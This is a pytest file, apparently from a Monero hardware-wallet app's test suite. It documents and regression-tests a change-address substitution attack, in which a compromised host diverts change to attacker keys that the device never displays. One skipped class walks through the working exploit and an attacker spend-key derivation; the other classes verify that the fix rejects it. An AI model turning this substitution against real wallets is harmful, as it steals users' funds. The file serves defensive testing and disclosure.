"""
Vulnerability PoC: Change-Address Substitution Attack
======================================================
A compromised host can replace the change output's (A_out, B_out) with an
attacker-controlled address while keeping is_change=True.  The device shows
only "Change: X XMR" (no destination address) and signs the transaction.
The attacker later spends the diverted output using the user's private view
key `a` (exported to the hot wallet for scanning) and their own spend key b'.

Attack path
-----------
  gen_txout_keys  (is_change=True, A_out=A', B_out=B'):
    derivation = 8 * a_device * R         ← uses USER's view key, not attacker's
    AKout      = H_s(derivation, index)
    P          = H_s(derivation, index)·G + B'   ← one-time key locked to B'

  mlsag_prehash_update (is_change=True, A_out=A', B_out=B'):
    UI shows "Change: X XMR" — destination address is NEVER displayed

  Spending by attacker (path A — has user's private view key a):
    D = 8 * a * R       (R is public, a exported for scanning)
    α = H_s(D, i)
    x = α + b'  mod l  (one-time spend key)
    x·G == P            ← attacker sweeps the change

Test classes
------------
  TestChangeAddressVuln   — demonstrates device ACCEPTS the attack (SW_OK).
                            After the Option-2 fix this class will fail at
                            test_gen_txout_keys (SecurityChangeAddress raised).
  TestChangeAddressFixed  — demonstrates device REJECTS the attack after the
                            fix (SecurityChangeAddress on gen_txout_keys).
  TestLegitimateChange    — sanity: user's own primary address IS accepted.

Keys used (from seed "abandon … about"):
  a = 0f3fe25d0c6d4c94dde0c0bcc214b233e9c72927f813728b0f01f28f9d5e1201
  b = 3b094ca7218f175e91fa2402b4ae239a2fe8262792a3e718533a1a357a1e4109
  A = 865cbfab852a1d1ccdfc7328e4dac90f78fc2154257d07522e9b79e637326dfa
  B = dae41d6b13568fdd71ec3d20c2f614c65fe819f36ca5da8d24df3bd89b2bad9d
"""

import pytest
import nacl.bindings as nb
from Crypto.Hash import keccak
from ragger.backend.interface import BackendInterface
from ragger.navigator import Navigator, NavInsID

from monero_client.monero_cmd import MoneroCmd
from monero_client.monero_crypto_cmd import MoneroCryptoCmd, PROTOCOL_VERSION
from monero_client.monero_types import InsType, Type, Keys, SigType
from monero_client.crypto.hmac import hmac_sha256
from monero_client.utils.varint import encode_varint
from monero_client.utils.utils import get_nano_review_instructions
from monero_client.exception import SecurityChangeAddress

# ---------------------------------------------------------------------------
# Monero Ed25519 helpers (client-side, for spending proof)
# ---------------------------------------------------------------------------
_L = 2 ** 252 + 27742317777372353535851937790883648493  # Ed25519 group order


def _sc_reduce32(b: bytes) -> bytes:
    return (int.from_bytes(b, "little") % _L).to_bytes(32, "little")


def _generate_key_derivation(pub_key: bytes, priv_key: bytes) -> bytes:
    """8 * priv_key * pub_key  (Monero ECDH derivation, no clamping)."""
    a8 = ((int.from_bytes(priv_key, "little") * 8) % _L).to_bytes(32, "little")
    return nb.crypto_scalarmult_ed25519_noclamp(a8, pub_key)


def _derivation_to_scalar(derivation: bytes, output_index: int) -> bytes:
    """H_s(derivation ‖ varint(index)) reduced mod l."""
    k = keccak.new(digest_bits=256)
    k.update(derivation)
    k.update(encode_varint(output_index))
    return _sc_reduce32(k.digest())


# ---------------------------------------------------------------------------
# Attacker's keypair  (deterministic: sc_reduce32 applied to fixed byte seeds)
# ---------------------------------------------------------------------------
_ATTACKER_B_PRIV = _sc_reduce32(bytes([0x11] * 32))
_ATTACKER_B_PUB = nb.crypto_scalarmult_ed25519_base_noclamp(_ATTACKER_B_PRIV)
_ATTACKER_A_PUB = nb.crypto_scalarmult_ed25519_base_noclamp(
    _sc_reduce32(bytes([0xAA] * 32))
)

# User (from the test seed "abandon … about")
_USER = Keys(
    public_view_key=bytes.fromhex(
        "865cbfab852a1d1ccdfc7328e4dac90f78fc2154257d07522e9b79e637326dfa"
    ),
    public_spend_key=bytes.fromhex(
        "dae41d6b13568fdd71ec3d20c2f614c65fe819f36ca5da8d24df3bd89b2bad9d"
    ),
    secret_view_key=bytes.fromhex(
        "0f3fe25d0c6d4c94dde0c0bcc214b233e9c72927f813728b0f01f28f9d5e1201"
    ),
    secret_spend_key=bytes.fromhex(
        "3b094ca7218f175e91fa2402b4ae239a2fe8262792a3e718533a1a357a1e4109"
    ),
    addr="5A8FgbMkmG2e3J41sBdjvjaBUyz8qHohsQcGtRf63qEUTMBv"
    "mA45fpp5pSacMdSg7A3b71RejLzB8EkGbfjp5PELVHCRUaE",
)

# Amounts: 4 XMR destination, 5.9 XMR change diverted to attacker, 0.1 XMR fee
_AMOUNT_DEST = 4_000_000_000_000    # output 0
_AMOUNT_CHANGE = 5_900_000_000_000  # output 1  ← diverted
_FEE = 100_000_000_000


# ---------------------------------------------------------------------------
# TestChangeAddressVuln
# ---------------------------------------------------------------------------
@pytest.mark.incremental
@pytest.mark.skip(reason="Tests that showed the fixed bug")
class TestChangeAddressVuln:
    """
    Demonstrates the attack end-to-end:
      1. gen_txout_keys accepts attacker's (A', B') with is_change=True → SW_OK
      2. validate (prehash_update) shows "Change: 5.9 XMR" with NO address → user
         cannot detect the substitution, approves → device signs
      3. Client-side math proves the attacker can spend the diverted output

    BEFORE the fix  → all steps pass (vulnerability present).
    AFTER the fix   → test_gen_txout_keys raises SecurityChangeAddress.
    """

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {
            "tx_pub_key": None,
            "_tx_priv_key": None,
            "_ak_amount": [[], []],
            "blinded_amount": [[], []],
            "blinded_mask": [[], []],
            "y": [[], []],
            "eph_key_change": None,  # P — the diverted one-time output key
        }

    @staticmethod
    def test_reset(monero: MoneroCmd):
        monero.reset_and_get_version(monero_client_version=b"0.18")

    @staticmethod
    def test_set_sig(monero: MoneroCmd):
        assert monero.set_signature_mode(sig_type=SigType.REAL) == SigType.REAL

    @staticmethod
    def test_open_tx(monero: MoneroCmd, state):
        tx_pub_key, _tx_priv_key, fvk, fsk = monero.open_tx()
        assert fvk == b"\x00" * 32
        assert fsk == b"\xff" * 32
        state["tx_pub_key"] = tx_pub_key
        state["_tx_priv_key"] = _tx_priv_key

    @staticmethod
    def test_gen_txout_keys(monero: MoneroCmd, state):
        """
        Both outputs accepted — vulnerability is here.
        Output 1 uses attacker's (A', B') with is_change=True; device does not
        verify that (A', B') belongs to the user.  SW_OK is returned.
        """
        receivers_view = [_USER.public_view_key, _ATTACKER_A_PUB]
        receivers_spend = [_USER.public_spend_key, _ATTACKER_B_PUB]
        is_change = [False, True]

        for i in range(2):
            _ak, eph_key = monero.gen_txout_keys(
                _tx_priv_key=state["_tx_priv_key"],
                tx_pub_key=state["tx_pub_key"],
                dst_pub_view_key=receivers_view[i],
                dst_pub_spend_key=receivers_spend[i],
                output_index=i,
                is_change_addr=is_change[i],
                is_subaddress=False,
            )
            state["_ak_amount"][i].append(_ak)
            if i == 1:
                state["eph_key_change"] = eph_key  # save P for spending proof

    @staticmethod
    def test_prefix_hash(monero: MoneroCmd, device, test_name: str):
        monero.prefix_hash_init(test_name, device, navigator=None, version=0, timelock=0)
        monero.prefix_hash_update(index=1, payload=b"", is_last=True)

    @staticmethod
    def test_gen_commitment_mask(monero: MoneroCmd, state):
        for i in range(2):
            state["y"][i].append(monero.gen_commitment_mask(state["_ak_amount"][i][0]))

    @staticmethod
    def test_blind(monero: MoneroCmd, state):
        amounts = [_AMOUNT_DEST, _AMOUNT_CHANGE]
        for i in range(2):
            bm, ba = monero.blind(
                _ak_amount=state["_ak_amount"][i][0],
                mask=state["y"][i][0],
                amount=amounts[i],
                is_short=True,
            )
            _, amt = monero.unblind(
                _ak_amount=state["_ak_amount"][i][0],
                blinded_mask=bm,
                blinded_amount=ba,
                is_short=True,
            )
            assert amounts[i] == int.from_bytes(amt, "little")
            state["blinded_mask"][i].append(bm)
            state["blinded_amount"][i].append(ba)

    @staticmethod
    def test_validate(
        monero: MoneroCmd,
        backend: BackendInterface,
        navigator: Navigator,
        test_name: str,
        state,
    ):
        """
        UI deception step.
        Device shows:
          • "Fee: 0.1 XMR"
          • "Amount: 4 XMR" + "Address: <user's primary address>"
          • "Change: 5.9 XMR"   ← NO destination address shown — user is deceived
        User approves; device signs the transaction.  SW_OK confirms the attack.
        """
        device = backend.device
        monero.validate_prehash_init(test_name, device, navigator, 1, 0, _FEE)

        # Output 0: legitimate, address is displayed
        monero.validate_prehash_update(
            backend,
            test_name,
            navigator,
            index=1,
            is_short=True,
            is_change_addr=False,
            is_subaddress=False,
            dst_pub_view_key=_USER.public_view_key,
            dst_pub_spend_key=_USER.public_spend_key,
            _ak_amount=state["_ak_amount"][0][0],
            commitment=bytes(32),
            blinded_amount=state["blinded_amount"][0][0],
            blinded_mask=state["blinded_mask"][0][0],
            is_last=False,
            do_navigation=False,
        )

        # Output 1: attacker's address, is_change=True.
        # The device will show "Change: 5.9 XMR" with NO address field.
        # We send the APDU inline and use navigator.navigate() (no snapshot compare)
        # to approve, exactly as a deceived user would.
        payload = b"".join((
            b"\x00",            # is_subaddress = False
            b"\x01",            # is_change     = True  ← triggers change-only UI
            _ATTACKER_A_PUB,    # A' — NOT shown to user
            _ATTACKER_B_PUB,    # B' — NOT shown to user
            state["_ak_amount"][1][0],
            hmac_sha256(state["_ak_amount"][1][0], MoneroCryptoCmd.HMAC_KEY, Type.AMOUNT_KEY),
            bytes(32),          # commitment
            state["blinded_mask"][1][0],
            state["blinded_amount"][1][0],
        ))

        if device.is_nano:
            instructions = get_nano_review_instructions(1)
        else:
            # Flex/Stax: swipe through fee + amount + addr pages, then approve
            instructions = [NavInsID.SWIPE_CENTER_TO_LEFT] * 3 + [
                NavInsID.USE_CASE_REVIEW_TAP,
                NavInsID.USE_CASE_REVIEW_CONFIRM,
            ]

        backend.wait_for_text_on_screen("Processing")
        with monero.transport.send_async(
            cla=PROTOCOL_VERSION,
            ins=InsType.INS_VALIDATE,
            p1=2,
            p2=2,
            option=0x02,  # is_last (no MORE_COMMAND) | is_short
            payload=payload,
        ):
            navigator.navigate(
                instructions,
                screen_change_after_last_instruction=False,
                timeout=10000,
            )

        sw, _ = monero.transport.async_response()
        # Device accepted attacker's address as change — attack confirmed
        assert sw & 0x9000, f"Expected SW_OK, got {hex(sw)}"

        # Finalize pass (no UI — accumulates / finalises the prehash)
        receivers_view = [_USER.public_view_key, _ATTACKER_A_PUB]
        receivers_spend = [_USER.public_spend_key, _ATTACKER_B_PUB]
        for i in range(2):
            monero.validate_prehash_finalize(
                index=i + 1,
                is_short=False,
                is_change_addr=False,
                is_subaddress=False,
                dst_pub_view_key=receivers_view[i],
                dst_pub_spend_key=receivers_spend[i],
                _ak_amount=state["_ak_amount"][i][0],
                commitment=bytes(32),
                blinded_amount=state["blinded_amount"][i][0],
                blinded_mask=state["blinded_mask"][i][0],
                is_last=(i == 1),
            )

    @staticmethod
    def test_close_tx(monero: MoneroCmd):
        monero.close_tx()

    @staticmethod
    def test_attacker_spend_proof(state):
        """
        Pure client-side proof that the attacker can spend the diverted output.

        Given public information (R on-chain) plus the private view key `a` that
        the hot wallet exports for scanning, the attacker computes the one-time
        spend key x and verifies x·G == P (the on-chain output key).

            D = 8 * a * R
            α = H_s(D ‖ varint(1))     ← output index 1
            P = α·G + B'               ← same derivation used by the device
            x = α + b'  (mod l)
            x·G == P  → attacker CAN sweep the change
        """
        R = state["tx_pub_key"]
        P_actual = state["eph_key_change"]
        assert P_actual is not None, "gen_txout_keys must have succeeded (vulnerability present)"

        a = _USER.secret_view_key

        # Step 1 — ECDH derivation (device used this internally for is_change=True)
        D = _generate_key_derivation(R, a)

        # Step 2 — derivation → amount-key scalar
        alpha = _derivation_to_scalar(D, output_index=1)

        # Step 3 — expected one-time pubkey: α·G + B'
        alpha_G = nb.crypto_scalarmult_ed25519_base_noclamp(alpha)
        P_expected = nb.crypto_core_ed25519_add(alpha_G, _ATTACKER_B_PUB)
        assert P_expected == P_actual, (
            f"Derivation mismatch\n"
            f"  expected : {P_expected.hex()}\n"
            f"  device   : {P_actual.hex()}"
        )

        # Step 4 — attacker's one-time spend key
        x = nb.crypto_core_ed25519_scalar_add(alpha, _ATTACKER_B_PRIV)

        # Step 5 — verify x·G == P
        P_check = nb.crypto_scalarmult_ed25519_base_noclamp(x)
        assert P_check == P_actual, (
            f"Spend key invalid: x·G ({P_check.hex()}) ≠ P ({P_actual.hex()})"
        )

        print(
            f"\n[Vuln confirmed] Attacker can sweep diverted change output:\n"
            f"  On-chain output key P  : {P_actual.hex()}\n"
            f"  Attacker spend key  x  : {x.hex()}\n"
            f"  x·G == P               : True"
        )


# ---------------------------------------------------------------------------
# TestChangeAddressFixed  (passes only after the Option-2 fix is applied)
# ---------------------------------------------------------------------------
@pytest.mark.incremental
class TestChangeAddressFixed:
    """
    After the fix, gen_txout_keys rejects is_change=True outputs whose
    (A_out, B_out) does not match the device-derived candidate set.

    Candidate set built by the device:
      • (A, B)           — user's primary address   (always included)
      • (A_{M,0}, B_{M,0})  for each major index M seen during
        INS_GET_SUBADDRESS_SECRET_KEY calls in this tx

    The attacker's (A', B') is overwhelmingly unlikely to collide with any
    candidate, so SW_SECURITY_CHANGE_ADDRESS (0x691C) is returned.
    """

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {"tx_pub_key": None, "_tx_priv_key": None}

    @staticmethod
    def test_reset_fixed(monero: MoneroCmd):
        monero.reset_and_get_version(monero_client_version=b"0.18")

    @staticmethod
    def test_set_sig_fixed(monero: MoneroCmd):
        assert monero.set_signature_mode(sig_type=SigType.REAL) == SigType.REAL

    @staticmethod
    def test_open_tx_fixed(monero: MoneroCmd, state):
        tx_pub_key, _tx_priv_key, _, _ = monero.open_tx()
        state["tx_pub_key"] = tx_pub_key
        state["_tx_priv_key"] = _tx_priv_key

    @staticmethod
    def test_gen_txout_keys_fixed(monero: MoneroCmd, state):
        """
        Output 0 (is_change=False, any address): accepted — check is not triggered.
        Output 1 (is_change=True, attacker's address): rejected → SecurityChangeAddress.
        """
        # Output 0: normal destination, no change-address check
        monero.gen_txout_keys(
            _tx_priv_key=state["_tx_priv_key"],
            tx_pub_key=state["tx_pub_key"],
            dst_pub_view_key=_USER.public_view_key,
            dst_pub_spend_key=_USER.public_spend_key,
            output_index=0,
            is_change_addr=False,
            is_subaddress=False,
        )

        # Output 1: attacker address tagged as change → MUST be rejected after fix.
        # Ragger's Speculos backend raises ExceptionRAPDU at the transport layer
        # for any non-9000 status before monero_cmd.py can dispatch to SecurityChangeAddress.
        from ragger.error import ExceptionRAPDU
        with pytest.raises(ExceptionRAPDU) as exc_info:
            monero.gen_txout_keys(
                _tx_priv_key=state["_tx_priv_key"],
                tx_pub_key=state["tx_pub_key"],
                dst_pub_view_key=_ATTACKER_A_PUB,
                dst_pub_spend_key=_ATTACKER_B_PUB,
                output_index=1,
                is_change_addr=True,
                is_subaddress=False,
            )
        assert exc_info.value.status == 0x691C, (
            f"Expected SW_SECURITY_CHANGE_ADDRESS (0x691C), got {hex(exc_info.value.status)}"
        )


# ---------------------------------------------------------------------------
# TestChangeAddressFixed_Prehash  (passes only after the Option-2 fix is applied)
# ---------------------------------------------------------------------------
@pytest.mark.incremental
class TestChangeAddressFixed_Prehash:
    """
    Exercises monero_check_change_address inside monero_apdu_mlsag_prehash_update
    (INS_VALIDATE P1=2).

    Setup: gen_txout_keys runs with the user's primary address for both outputs, so
    the OUTK integrity hash is built correctly and the gen_txout_keys check passes.
    The substitution attack is deferred to prehash_update, where the host swaps
    output 1's Aout/Bout to the attacker's keys while keeping is_change=True.

    After the fix, prehash_update calls monero_check_change_address before any state
    mutation and returns SW_SECURITY_CHANGE_ADDRESS (0x691C) without showing UI.
    """

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {
            "tx_pub_key": None,
            "_tx_priv_key": None,
            "_ak_amount": [None, None],
            "y": [None, None],
            "blinded_mask": [None, None],
            "blinded_amount": [None, None],
        }

    @staticmethod
    def test_reset_ph(monero: MoneroCmd):
        monero.reset_and_get_version(monero_client_version=b"0.18")

    @staticmethod
    def test_set_sig_ph(monero: MoneroCmd):
        assert monero.set_signature_mode(sig_type=SigType.REAL) == SigType.REAL

    @staticmethod
    def test_open_tx_ph(monero: MoneroCmd, state):
        tx_pub_key, _tx_priv_key, _, _ = monero.open_tx()
        state["tx_pub_key"] = tx_pub_key
        state["_tx_priv_key"] = _tx_priv_key

    @staticmethod
    def test_gen_txout_keys_ph(monero: MoneroCmd, state):
        """
        Both outputs use the user's primary address so gen_txout_keys passes the fix.
        Output 1 has is_change=True with (A, B) — building the OUTK hash correctly.
        The attacker's substitution is deferred to prehash_update.
        """
        receivers_view = [_USER.public_view_key, _USER.public_view_key]
        receivers_spend = [_USER.public_spend_key, _USER.public_spend_key]
        is_change = [False, True]
        for i in range(2):
            _ak, _ = monero.gen_txout_keys(
                _tx_priv_key=state["_tx_priv_key"],
                tx_pub_key=state["tx_pub_key"],
                dst_pub_view_key=receivers_view[i],
                dst_pub_spend_key=receivers_spend[i],
                output_index=i,
                is_change_addr=is_change[i],
                is_subaddress=False,
            )
            state["_ak_amount"][i] = _ak

    @staticmethod
    def test_prefix_hash_ph(monero: MoneroCmd, device, test_name: str):
        monero.prefix_hash_init(test_name, device, navigator=None, version=0, timelock=0)
        monero.prefix_hash_update(index=1, payload=b"", is_last=True)

    @staticmethod
    def test_gen_commitment_mask_ph(monero: MoneroCmd, state):
        for i in range(2):
            state["y"][i] = monero.gen_commitment_mask(state["_ak_amount"][i])

    @staticmethod
    def test_blind_ph(monero: MoneroCmd, state):
        amounts = [_AMOUNT_DEST, _AMOUNT_CHANGE]
        for i in range(2):
            bm, ba = monero.blind(
                _ak_amount=state["_ak_amount"][i],
                mask=state["y"][i],
                amount=amounts[i],
                is_short=True,
            )
            state["blinded_mask"][i] = bm
            state["blinded_amount"][i] = ba

    @staticmethod
    def test_prehash_update_rejected(
        monero: MoneroCmd,
        backend: BackendInterface,
        navigator: Navigator,
        test_name: str,
        state,
    ):
        """
        Fee UI is shown and approved (legitimate).  Immediately after, the very
        first prehash_update carries attacker's (A', B') with is_change=True.
        monero_check_change_address fires before any state mutation or output UI
        and returns SW_SECURITY_CHANGE_ADDRESS (0x691C) on both Nano and Flex.

        No intermediate legitimate output is processed: the check rejects
        regardless of position because it runs before any state mutation.
        """
        device = backend.device

        # Fee approval — legitimate, expected snapshot generated here
        monero.validate_prehash_init(test_name, device, navigator, 1, 0, _FEE)

        # Attacker's (A', B') as the first and only prehash_update.
        # Rejection is synchronous — no output UI is ever shown on any platform.
        payload = b"".join((
            b"\x00",                    # is_subaddress = False
            b"\x01",                    # is_change     = True
            _ATTACKER_A_PUB,            # A' — not in device's candidate set
            _ATTACKER_B_PUB,            # B' — not in device's candidate set
            state["_ak_amount"][1],     # AKout with valid HMAC
            hmac_sha256(state["_ak_amount"][1], MoneroCryptoCmd.HMAC_KEY, Type.AMOUNT_KEY),
            bytes(32),                  # commitment — check never reached
            state["blinded_mask"][1],
            state["blinded_amount"][1],
        ))

        monero.transport.send(
            cla=PROTOCOL_VERSION,
            ins=InsType.INS_VALIDATE,
            p1=2,
            p2=1,
            option=0x02,  # is_last (MORE_COMMAND not set) | is_short
            payload=payload,
        )

        from ragger.error import ExceptionRAPDU
        with pytest.raises(ExceptionRAPDU) as exc_info:
            monero.transport.recv()
        assert exc_info.value.status == 0x691C, (
            f"Expected SW_SECURITY_CHANGE_ADDRESS (0x691C), got {hex(exc_info.value.status)}"
        )


# ---------------------------------------------------------------------------
# TestLegitimateChange  — sanity: user's own primary address is always accepted
# ---------------------------------------------------------------------------
@pytest.mark.incremental
class TestLegitimateChange:
    """
    After the fix, the user's primary address IS accepted as a change address.
    The device compares (A_out, B_out) against its internally derived (A, B)
    and finds a match.
    """

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {"tx_pub_key": None, "_tx_priv_key": None}

    @staticmethod
    def test_reset_legit(monero: MoneroCmd):
        monero.reset_and_get_version(monero_client_version=b"0.18")

    @staticmethod
    def test_set_sig_legit(monero: MoneroCmd):
        assert monero.set_signature_mode(sig_type=SigType.REAL) == SigType.REAL

    @staticmethod
    def test_open_tx_legit(monero: MoneroCmd, state):
        tx_pub_key, _tx_priv_key, _, _ = monero.open_tx()
        state["tx_pub_key"] = tx_pub_key
        state["_tx_priv_key"] = _tx_priv_key

    @staticmethod
    def test_primary_address_accepted_as_change(monero: MoneroCmd, state):
        """
        is_change=True with (A, B) = user's primary address must return SW_OK.
        This verifies that the fix does not break the legitimate flow.
        """
        monero.gen_txout_keys(
            _tx_priv_key=state["_tx_priv_key"],
            tx_pub_key=state["tx_pub_key"],
            dst_pub_view_key=_USER.public_view_key,
            dst_pub_spend_key=_USER.public_spend_key,
            output_index=0,
            is_change_addr=True,
            is_subaddress=False,
        )


# ---------------------------------------------------------------------------
# Helpers for subaddress tests
# ---------------------------------------------------------------------------

def _compute_subaddress_keys(major: int, minor: int):
    """
    Compute (A_{M,m}, B_{M,m}) offline from the test-seed keys.
      d      = H_s("SubAddr\\x00" || a || M_LE32 || m_LE32)
      B_{Mm} = B + d·G
      A_{Mm} = a · B_{Mm}
    """
    k = keccak.new(digest_bits=256)
    k.update(
        b"SubAddr\x00"
        + _USER.secret_view_key
        + major.to_bytes(4, "little")
        + minor.to_bytes(4, "little")
    )
    d = _sc_reduce32(k.digest())
    D = nb.crypto_core_ed25519_add(
        _USER.public_spend_key,
        nb.crypto_scalarmult_ed25519_base_noclamp(d),
    )
    C = nb.crypto_scalarmult_ed25519_noclamp(_USER.secret_view_key, D)
    return C, D  # (view_pub, spend_pub)


def _record_index(monero: MoneroCmd, fake_view_key: bytes, major: int, minor: int) -> None:
    """
    Send INS_GET_SUBADDRESS_SECRET_KEY with the given (major, minor) index so
    the device records it in tx_change_major/minor_indices.  Return value is
    discarded — we only care that the recording side-effect happens.
    """
    idx = major.to_bytes(4, "little") + minor.to_bytes(4, "little")
    payload = (
        fake_view_key
        + hmac_sha256(fake_view_key, MoneroCryptoCmd.HMAC_KEY, Type.SCALAR)
        + idx
    )
    monero.transport.send(
        cla=PROTOCOL_VERSION,
        ins=InsType.INS_GET_SUBADDRESS_SECRET_KEY,
        p1=0,
        p2=0,
        option=0,
        payload=payload,
    )
    sw, _ = monero.transport.recv()
    assert sw & 0x9000, f"INS_GET_SUBADDRESS_SECRET_KEY failed with {hex(sw)}"


# ---------------------------------------------------------------------------
# TestSubaddressChangeDirect — exact (M, m≠0) accepted as change
# ---------------------------------------------------------------------------
@pytest.mark.incremental
class TestSubaddressChangeDirect:
    """
    When an input came from subaddress (M=1, m=3), that exact subaddress is
    accepted as a change address.  Previously only (M, 0) was checked, so
    change to (M, m≠0) was incorrectly rejected.
    """

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {"tx_pub_key": None, "_tx_priv_key": None, "fvk": None}

    @staticmethod
    def test_reset_sub_direct(monero: MoneroCmd):
        monero.reset_and_get_version(monero_client_version=b"0.18")

    @staticmethod
    def test_set_sig_sub_direct(monero: MoneroCmd):
        assert monero.set_signature_mode(sig_type=SigType.REAL) == SigType.REAL

    @staticmethod
    def test_open_tx_sub_direct(monero: MoneroCmd, state):
        tx_pub_key, _tx_priv_key, fvk, _ = monero.open_tx()
        state["tx_pub_key"] = tx_pub_key
        state["_tx_priv_key"] = _tx_priv_key
        state["fvk"] = fvk

    @staticmethod
    def test_subaddr_direct_accepted(monero: MoneroCmd, state):
        """
        Record index (1, 3) via INS_GET_SUBADDRESS_SECRET_KEY, then verify
        that gen_txout_keys with is_change=True and (A_{1,3}, B_{1,3}) succeeds.
        """
        _record_index(monero, state["fvk"], major=1, minor=3)
        A_sub, B_sub = _compute_subaddress_keys(major=1, minor=3)

        # Must not raise — the exact subaddress is in the whitelist.
        monero.gen_txout_keys(
            _tx_priv_key=state["_tx_priv_key"],
            tx_pub_key=state["tx_pub_key"],
            dst_pub_view_key=A_sub,
            dst_pub_spend_key=B_sub,
            output_index=0,
            is_change_addr=True,
            is_subaddress=True,
        )


# ---------------------------------------------------------------------------
# TestSubaddressChangeAccountRoot — (M, 0) accepted when input from (M, m≠0)
# ---------------------------------------------------------------------------
@pytest.mark.incremental
class TestSubaddressChangeAccountRoot:
    """
    When an input came from subaddress (M=1, m=3), the account root (M=1, m=0)
    is also accepted as a change address — matching monero-gui's behaviour of
    always routing change to get_subaddress({subaddr_account, 0}).
    """

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {"tx_pub_key": None, "_tx_priv_key": None, "fvk": None}

    @staticmethod
    def test_reset_sub_root(monero: MoneroCmd):
        monero.reset_and_get_version(monero_client_version=b"0.18")

    @staticmethod
    def test_set_sig_sub_root(monero: MoneroCmd):
        assert monero.set_signature_mode(sig_type=SigType.REAL) == SigType.REAL

    @staticmethod
    def test_open_tx_sub_root(monero: MoneroCmd, state):
        tx_pub_key, _tx_priv_key, fvk, _ = monero.open_tx()
        state["tx_pub_key"] = tx_pub_key
        state["_tx_priv_key"] = _tx_priv_key
        state["fvk"] = fvk

    @staticmethod
    def test_account_root_accepted(monero: MoneroCmd, state):
        """
        Record index (1, 3) — only the input subaddress, not the root.
        Then verify that gen_txout_keys with is_change=True and the account
        root (A_{1,0}, B_{1,0}) succeeds (standard wallet change routing).
        """
        _record_index(monero, state["fvk"], major=1, minor=3)
        A_root, B_root = _compute_subaddress_keys(major=1, minor=0)

        # Must not raise — account root of a seen major is always whitelisted.
        monero.gen_txout_keys(
            _tx_priv_key=state["_tx_priv_key"],
            tx_pub_key=state["tx_pub_key"],
            dst_pub_view_key=A_root,
            dst_pub_spend_key=B_root,
            output_index=0,
            is_change_addr=True,
            is_subaddress=True,
        )
